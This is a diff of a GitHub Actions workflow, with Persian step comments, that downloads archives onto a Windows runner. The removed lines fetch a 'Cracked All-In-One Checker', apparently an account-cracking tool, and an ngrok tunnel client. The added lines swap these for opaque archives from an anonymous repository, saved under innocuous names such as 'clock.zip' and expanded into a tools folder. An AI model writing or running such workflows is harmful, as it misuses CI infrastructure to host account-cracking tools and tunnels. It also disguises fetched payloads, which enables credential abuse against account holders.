@@ -20,13 +20,13 @@ jobs:
     # مرحله 3: دانلود وابستگی‌ها
     - name: Retrieve Dependencies
       run: |
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alisanxd/Cracked-All-In-One-Checker/refs/heads/main/All-in-One%20Checker%20Version%204.9.8.rar" -OutFile "$env:USERPROFILE\Desktop\world.rar"
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/asda21kl/mynicething1/refs/heads/main/clock.zip" -OutFile "$env:USERPROFILE\Desktop\clock.zip"
         Invoke-WebRequest -Uri "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-713.exe" -OutFile "$env:USERPROFILE\Desktop\winrar.exe"
 
     # مرحله 4: دریافت ابزار جانبی
     - name: Setup Auxiliary Tools
       run: |
-        Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile conn.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/asda21kl/mynicething1/refs/heads/main/clockwork.zip -OutFile conn.zip
         Expand-Archive conn.zip -DestinationPath tools
         dir tools
 
